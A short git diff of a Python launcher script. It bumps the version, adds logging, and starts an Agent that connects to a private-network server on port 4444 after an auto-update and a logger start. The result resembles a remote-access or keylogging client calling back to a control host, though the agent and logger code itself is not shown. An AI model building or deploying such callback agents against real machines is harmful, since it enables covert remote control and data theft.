@@ -1,18 +1,25 @@
 from logger import start_logger
 from updater import Updater
+import logging 
+from agent import Agent 
 
 #test
 MANIFEST = "http://192.168.122.1:5000/latest.json"
-__version__ = "1.3.0"
+__version__ = "1.4.0"
 
 
 
 if __name__ == "__main__":
+    logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s %(name)s %(levelname)s %(message)s",
+)
     try:
         Updater(__version__, MANIFEST).run()
         start_logger()
+        Agent(server_host="192.168.122.1", server_port=4444).start()
     except Exception as e:
         print(f"CRITICAL ERROR: {e}")
 
     # Keeps the console window open so you can read errors
-    input("\nPress Enter to exit...")
+    
